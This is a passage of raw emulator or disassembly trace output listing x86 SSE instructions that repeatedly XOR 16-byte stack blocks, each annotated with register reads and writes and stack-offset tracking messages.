regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9880 for stack size 0x10000 0x404e94: pxor xmm1, xmmword ptr [esp + 0x550], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8550 for stack size 0x10000 0x404e9d: movaps xmmword ptr [esp + 0x1880], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9880 for stack size 0x10000 saving data to stack: 0 16 0x404ea5: movaps xmm1, xmmword ptr [esp + 0x1890], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9890 for stack size 0x10000 0x404ead: pxor xmm1, xmmword ptr [esp + 0x560], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8560 for stack size 0x10000 0x404eb6: movaps xmmword ptr [esp + 0x1890], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9890 for stack size 0x10000 saving data to stack: 0 16 0x404ebe: movaps xmm1, xmmword ptr [esp + 0x18a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98a0 for stack size 0x10000 0x404ec6: pxor xmm1, xmmword ptr [esp + 0x570], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8570 for stack size 0x10000 0x404ecf: movaps xmmword ptr [esp + 0x18a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98a0 for stack size 0x10000 saving data to stack: 0 16 0x404ed7: movaps xmm1, xmmword ptr [esp + 0x18b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98b0 for stack size 0x10000 0x404edf: pxor xmm1, xmmword ptr [esp + 0x580], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8580 for stack size 0x10000 0x404ee8: movaps xmmword ptr [esp + 0x18b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98b0 for stack size 0x10000 saving data to stack: 0 16 0x404ef0: movaps xmm1, xmmword ptr [esp + 0x18c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98c0 for stack size 0x10000 0x404ef8: pxor xmm1, xmmword ptr [esp + 0x590], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8590 for stack size 0x10000 0x404f01: movaps xmmword ptr [esp + 0x18c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98c0 for stack size 0x10000 saving data to stack: 0 16 0x404f09: movaps xmm1, xmmword ptr [esp + 0x18d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98d0 for stack size 0x10000 0x404f11: pxor xmm1, xmmword ptr [esp + 0x5a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85a0 for stack size 0x10000 0x404f1a: movaps xmmword ptr [esp + 0x18d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98d0 for stack size 0x10000 saving data to stack: 0 16 0x404f22: movaps xmm1, xmmword ptr [esp + 0x18e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98e0 for stack size 0x10000 0x404f2a: pxor xmm1, xmmword ptr [esp + 0x5b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85b0 for stack size 0x10000 0x404f33: movaps xmmword ptr [esp + 0x18e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98e0 for stack size 0x10000 saving data to stack: 0 16 0x404f3b: movaps xmm1, xmmword ptr [esp + 0x18f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x98f0 for stack size 0x10000 0x404f43: pxor xmm1, xmmword ptr [esp + 0x5c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85c0 for stack size 0x10000 0x404f4c: movaps xmmword ptr [esp + 0x18f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x98f0 for stack size 0x10000 saving data to stack: 0 16 0x404f54: movaps xmm1, xmmword ptr [esp + 0x1900], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9900 for stack size 0x10000 0x404f5c: pxor xmm1, xmmword ptr [esp + 0x5d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85d0 for stack size 0x10000 0x404f65: movaps xmmword ptr [esp + 0x1900], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9900 for stack size 0x10000 saving data to stack: 0 16 0x404f6d: movaps xmm1, xmmword ptr [esp + 0x1910], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9910 for stack size 0x10000 0x404f75: pxor xmm1, xmmword ptr [esp + 0x5e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85e0 for stack size 0x10000 0x404f7e: movaps xmmword ptr [esp + 0x1910], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9910 for stack size 0x10000 saving data to stack: 0 16 0x404f86: movaps xmm1, xmmword ptr [esp + 0x1920], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9920 for stack size 0x10000 0x404f8e: pxor xmm1, xmmword ptr [esp + 0x5f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x85f0 for stack size 0x10000 0x404f97: movaps xmmword ptr [esp + 0x1920], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9920 for stack size 0x10000 saving data to stack: 0 16 0x404f9f: movaps xmm1, xmmword ptr [esp + 0x1930], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9930 for stack size 0x10000 0x404fa7: pxor xmm1, xmmword ptr [esp + 0x600], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8600 for stack size 0x10000 0x404fb0: movaps xmmword ptr [esp + 0x1930], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9930 for stack size 0x10000 saving data to stack: 0 16 0x404fb8: movaps xmm1, xmmword ptr [esp + 0x1940], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9940 for stack size 0x10000 0x404fc0: pxor xmm1, xmmword ptr [esp + 0x610], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8610 for stack size 0x10000 0x404fc9: movaps xmmword ptr [esp + 0x1940], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9940 for stack size 0x10000 saving data to stack: 0 16 0x404fd1: movaps xmm1, xmmword ptr [esp + 0x1950], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9950 for stack size 0x10000 0x404fd9: pxor xmm1, xmmword ptr [esp + 0x620], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8620 for stack size 0x10000 0x404fe2: movaps xmmword ptr [esp + 0x1950], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9950 for stack size 0x10000 saving data to stack: 0 16 0x404fea: movaps xmm1, xmmword ptr [esp + 0x1960], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9960 for stack size 0x10000 0x404ff2: pxor xmm1, xmmword ptr [esp + 0x630], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8630 for stack size 0x10000 0x404ffb: movaps xmmword ptr [esp + 0x1960], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9960 for stack size 0x10000 saving data to stack: 0 16 0x405003: movaps xmm1, xmmword ptr [esp + 0x1970], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9970 for stack size 0x10000 0x40500b: pxor xmm1, xmmword ptr [esp + 0x640], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8640 for stack size 0x10000 0x405014: movaps xmmword ptr [esp + 0x1970], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9970 for stack size 0x10000 saving data to stack: 0 16 0x40501c: movaps xmm1, xmmword ptr [esp + 0x1980], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9980 for stack size 0x10000 0x405024: pxor xmm1, xmmword ptr [esp + 0x650], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8650 for stack size 0x10000 0x40502d: movaps xmmword ptr [esp + 0x1980], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9980 for stack size 0x10000 saving data to stack: 0 16 0x405035: movaps xmm1, xmmword ptr [esp + 0x1990], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9990 for stack size 0x10000 0x40503d: pxor xmm1, xmmword ptr [esp + 0x660], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8660 for stack size 0x10000 0x405046: movaps xmmword ptr [esp + 0x1990], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9990 for stack size 0x10000 saving data to stack: 0 16 0x40504e: movaps xmm1, xmmword ptr [esp + 0x19a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99a0 for stack size 0x10000 0x405056: pxor xmm1, xmmword ptr [esp + 0x670], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8670 for stack size 0x10000 0x40505f: movaps xmmword ptr [esp + 0x19a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99a0 for stack size 0x10000 saving data to stack: 0 16 0x405067: movaps xmm1, xmmword ptr [esp + 0x19b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99b0 for stack size 0x10000 0x40506f: pxor xmm1, xmmword ptr [esp + 0x680], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8680 for stack size 0x10000 0x405078: movaps xmmword ptr [esp + 0x19b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99b0 for stack size 0x10000 saving data to stack: 0 16 0x405080: movaps xmm1, xmmword ptr [esp + 0x19c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99c0 for stack size 0x10000 0x405088: pxor xmm1, xmmword ptr [esp + 0x690], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8690 for stack size 0x10000 0x405091: movaps xmmword ptr [esp + 0x19c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99c0 for stack size 0x10000 saving data to stack: 0 16 0x405099: movaps xmm1, xmmword ptr [esp + 0x19d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99d0 for stack size 0x10000 0x4050a1: pxor xmm1, xmmword ptr [esp + 0x6a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86a0 for stack size 0x10000 0x4050aa: movaps xmmword ptr [esp + 0x19d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99d0 for stack size 0x10000 saving data to stack: 0 16 0x4050b2: movaps xmm1, xmmword ptr [esp + 0x19e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99e0 for stack size 0x10000 0x4050ba: pxor xmm1, xmmword ptr [esp + 0x6b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86b0 for stack size 0x10000 0x4050c3: movaps xmmword ptr [esp + 0x19e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99e0 for stack size 0x10000 saving data to stack: 0 16 0x4050cb: movaps xmm1, xmmword ptr [esp + 0x19f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x99f0 for stack size 0x10000 0x4050d3: pxor xmm1, xmmword ptr [esp + 0x6c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86c0 for stack size 0x10000 0x4050dc: movaps xmmword ptr [esp + 0x19f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x99f0 for stack size 0x10000 saving data to stack: 0 16 0x4050e4: movaps xmm1, xmmword ptr [esp + 0x1a00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a00 for stack size 0x10000 0x4050ec: pxor xmm1, xmmword ptr [esp + 0x6d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86d0 for stack size 0x10000 0x4050f5: movaps xmmword ptr [esp + 0x1a00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a00 for stack size 0x10000 saving data to stack: 0 16 0x4050fd: movaps xmm1, xmmword ptr [esp + 0x1a10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a10 for stack size 0x10000 0x405105: pxor xmm1, xmmword ptr [esp + 0x6e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86e0 for stack size 0x10000 0x40510e: movaps xmmword ptr [esp + 0x1a10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a10 for stack size 0x10000 saving data to stack: 0 16 0x405116: movaps xmm1, xmmword ptr [esp + 0x1a20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a20 for stack size 0x10000 0x40511e: pxor xmm1, xmmword ptr [esp + 0x6f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x86f0 for stack size 0x10000 0x405127: movaps xmmword ptr [esp + 0x1a20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a20 for stack size 0x10000 saving data to stack: 0 16 0x40512f: movaps xmm1, xmmword ptr [esp + 0x1a30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a30 for stack size 0x10000 0x405137: pxor xmm1, xmmword ptr [esp + 0x700], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8700 for stack size 0x10000 0x405140: movaps xmmword ptr [esp + 0x1a30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a30 for stack size 0x10000 saving data to stack: 0 16 0x405148: movaps xmm1, xmmword ptr [esp + 0x1a40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a40 for stack size 0x10000 0x405150: pxor xmm1, xmmword ptr [esp + 0x710], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8710 for stack size 0x10000 0x405159: movaps xmmword ptr [esp + 0x1a40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a40 for stack size 0x10000 saving data to stack: 0 16 0x405161: movaps xmm1, xmmword ptr [esp + 0x1a50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a50 for stack size 0x10000 0x405169: pxor xmm1, xmmword ptr [esp + 0x720], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8720 for stack size 0x10000 0x405172: movaps xmmword ptr [esp + 0x1a50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a50 for stack size 0x10000 saving data to stack: 0 16 0x40517a: movaps xmm1, xmmword ptr [esp + 0x1a60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a60 for stack size 0x10000 0x405182: pxor xmm1, xmmword ptr [esp + 0x730], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8730 for stack size 0x10000 0x40518b: movaps xmmword ptr [esp + 0x1a60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a60 for stack size 0x10000 saving data to stack: 0 16 0x405193: movaps xmm1, xmmword ptr [esp + 0x1a70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a70 for stack size 0x10000 0x40519b: pxor xmm1, xmmword ptr [esp + 0x740], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8740 for stack size 0x10000 0x4051a4: movaps xmmword ptr [esp + 0x1a70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a70 for stack size 0x10000 saving data to stack: 0 16 0x4051ac: movaps xmm1, xmmword ptr [esp + 0x1a80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a80 for stack size 0x10000 0x4051b4: pxor xmm1, xmmword ptr [esp + 0x750], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8750 for stack size 0x10000 0x4051bd: movaps xmmword ptr [esp + 0x1a80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a80 for stack size 0x10000 saving data to stack: 0 16 0x4051c5: movaps xmm1, xmmword ptr [esp + 0x1a90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9a90 for stack size 0x10000 0x4051cd: pxor xmm1, xmmword ptr [esp + 0x760], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8760 for stack size 0x10000 0x4051d6: movaps xmmword ptr [esp + 0x1a90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9a90 for stack size 0x10000 saving data to stack: 0 16 0x4051de: movaps xmm1, xmmword ptr [esp + 0x1aa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9aa0 for stack size 0x10000 0x4051e6: pxor xmm1, xmmword ptr [esp + 0x770], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8770 for stack size 0x10000 0x4051ef: movaps xmmword ptr [esp + 0x1aa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9aa0 for stack size 0x10000 saving data to stack: 0 16 0x4051f7: movaps xmm1, xmmword ptr [esp + 0x1ab0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ab0 for stack size 0x10000 0x4051ff: pxor xmm1, xmmword ptr [esp + 0x780], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8780 for stack size 0x10000 0x405208: movaps xmmword ptr [esp + 0x1ab0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ab0 for stack size 0x10000 saving data to stack: 0 16 0x405210: movaps xmm1, xmmword ptr [esp + 0x1ac0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ac0 for stack size 0x10000 0x405218: pxor xmm1, xmmword ptr [esp + 0x790], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8790 for stack size 0x10000 0x405221: movaps xmmword ptr [esp + 0x1ac0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ac0 for stack size 0x10000 saving data to stack: 0 16 0x405229: movaps xmm1, xmmword ptr [esp + 0x1ad0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ad0 for stack size 0x10000 0x405231: pxor xmm1, xmmword ptr [esp + 0x7a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87a0 for stack size 0x10000 0x40523a: movaps xmmword ptr [esp + 0x1ad0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ad0 for stack size 0x10000 saving data to stack: 0 16 0x405242: movaps xmm1, xmmword ptr [esp + 0x1ae0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ae0 for stack size 0x10000 0x40524a: pxor xmm1, xmmword ptr [esp + 0x7b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87b0 for stack size 0x10000 0x405253: movaps xmmword ptr [esp + 0x1ae0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ae0 for stack size 0x10000 saving data to stack: 0 16 0x40525b: movaps xmm1, xmmword ptr [esp + 0x1af0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9af0 for stack size 0x10000 0x405263: pxor xmm1, xmmword ptr [esp + 0x7c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87c0 for stack size 0x10000 0x40526c: movaps xmmword ptr [esp + 0x1af0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9af0 for stack size 0x10000 saving data to stack: 0 16 0x405274: movaps xmm1, xmmword ptr [esp + 0x1b00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b00 for stack size 0x10000 0x40527c: pxor xmm1, xmmword ptr [esp + 0x7d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87d0 for stack size 0x10000 0x405285: movaps xmmword ptr [esp + 0x1b00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b00 for stack size 0x10000 saving data to stack: 0 16 0x40528d: movaps xmm1, xmmword ptr [esp + 0x1b10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b10 for stack size 0x10000 0x405295: pxor xmm1, xmmword ptr [esp + 0x7e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87e0 for stack size 0x10000 0x40529e: movaps xmmword ptr [esp + 0x1b10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b10 for stack size 0x10000 saving data to stack: 0 16 0x4052a6: movaps xmm1, xmmword ptr [esp + 0x1b20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b20 for stack size 0x10000 0x4052ae: pxor xmm1, xmmword ptr [esp + 0x7f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x87f0 for stack size 0x10000 0x4052b7: movaps xmmword ptr [esp + 0x1b20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b20 for stack size 0x10000 saving data to stack: 0 16 0x4052bf: movaps xmm1, xmmword ptr [esp + 0x1b30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b30 for stack size 0x10000 0x4052c7: pxor xmm1, xmmword ptr [esp + 0x800], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8800 for stack size 0x10000 0x4052d0: movaps xmmword ptr [esp + 0x1b30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b30 for stack size 0x10000 saving data to stack: 0 16 0x4052d8: movaps xmm1, xmmword ptr [esp + 0x1b40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b40 for stack size 0x10000 0x4052e0: pxor xmm1, xmmword ptr [esp + 0x810], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8810 for stack size 0x10000 0x4052e9: movaps xmmword ptr [esp + 0x1b40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b40 for stack size 0x10000 saving data to stack: 0 16 0x4052f1: movaps xmm1, xmmword ptr [esp + 0x1b50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b50 for stack size 0x10000 0x4052f9: pxor xmm1, xmmword ptr [esp + 0x820], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8820 for stack size 0x10000 0x405302: movaps xmmword ptr [esp + 0x1b50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b50 for stack size 0x10000 saving data to stack: 0 16 0x40530a: movaps xmm1, xmmword ptr [esp + 0x1b60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b60 for stack size 0x10000 0x405312: pxor xmm1, xmmword ptr [esp + 0x830], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8830 for stack size 0x10000 0x40531b: movaps xmmword ptr [esp + 0x1b60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b60 for stack size 0x10000 saving data to stack: 0 16 0x405323: movaps xmm1, xmmword ptr [esp + 0x1b70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b70 for stack size 0x10000 0x40532b: pxor xmm1, xmmword ptr [esp + 0x840], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8840 for stack size 0x10000 0x405334: movaps xmmword ptr [esp + 0x1b70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b70 for stack size 0x10000 saving data to stack: 0 16 0x40533c: movaps xmm1, xmmword ptr [esp + 0x1b80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b80 for stack size 0x10000 0x405344: pxor xmm1, xmmword ptr [esp + 0x850], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8850 for stack size 0x10000 0x40534d: movaps xmmword ptr [esp + 0x1b80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b80 for stack size 0x10000 saving data to stack: 0 16 0x405355: movaps xmm1, xmmword ptr [esp + 0x1b90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9b90 for stack size 0x10000 0x40535d: pxor xmm1, xmmword ptr [esp + 0x860], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8860 for stack size 0x10000 0x405366: movaps xmmword ptr [esp + 0x1b90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9b90 for stack size 0x10000 saving data to stack: 0 16 0x40536e: movaps xmm1, xmmword ptr [esp + 0x1ba0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ba0 for stack size 0x10000 0x405376: pxor xmm1, xmmword ptr [esp + 0x870], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8870 for stack size 0x10000 0x40537f: movaps xmmword ptr [esp + 0x1ba0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ba0 for stack size 0x10000 saving data to stack: 0 16 0x405387: movaps xmm1, xmmword ptr [esp + 0x1bb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9bb0 for stack size 0x10000 0x40538f: pxor xmm1, xmmword ptr [esp + 0x880], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8880 for stack size 0x10000 0x405398: movaps xmmword ptr [esp + 0x1bb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9bb0 for stack size 0x10000 saving data to stack: 0 16 0x4053a0: movaps xmm1, xmmword ptr [esp + 0x1bc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9bc0 for stack size 0x10000 0x4053a8: pxor xmm1, xmmword ptr [esp + 0x890], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8890 for stack size 0x10000 0x4053b1: movaps xmmword ptr [esp + 0x1bc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9bc0 for stack size 0x10000 saving data to stack: 0 16 0x4053b9: movaps xmm1, xmmword ptr [esp + 0x1bd0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9bd0 for stack size 0x10000 0x4053c1: pxor xmm1, xmmword ptr [esp + 0x8a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88a0 for stack size 0x10000 0x4053ca: movaps xmmword ptr [esp + 0x1bd0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9bd0 for stack size 0x10000 saving data to stack: 0 16 0x4053d2: movaps xmm1, xmmword ptr [esp + 0x1be0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9be0 for stack size 0x10000 0x4053da: pxor xmm1, xmmword ptr [esp + 0x8b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88b0 for stack size 0x10000 0x4053e3: movaps xmmword ptr [esp + 0x1be0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9be0 for stack size 0x10000 saving data to stack: 0 16 0x4053eb: movaps xmm1, xmmword ptr [esp + 0x1bf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9bf0 for stack size 0x10000 0x4053f3: pxor xmm1, xmmword ptr [esp + 0x8c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88c0 for stack size 0x10000 0x4053fc: movaps xmmword ptr [esp + 0x1bf0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9bf0 for stack size 0x10000 saving data to stack: 0 16 0x405404: movaps xmm1, xmmword ptr [esp + 0x1c00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c00 for stack size 0x10000 0x40540c: pxor xmm1, xmmword ptr [esp + 0x8d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88d0 for stack size 0x10000 0x405415: movaps xmmword ptr [esp + 0x1c00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c00 for stack size 0x10000 saving data to stack: 0 16 0x40541d: movaps 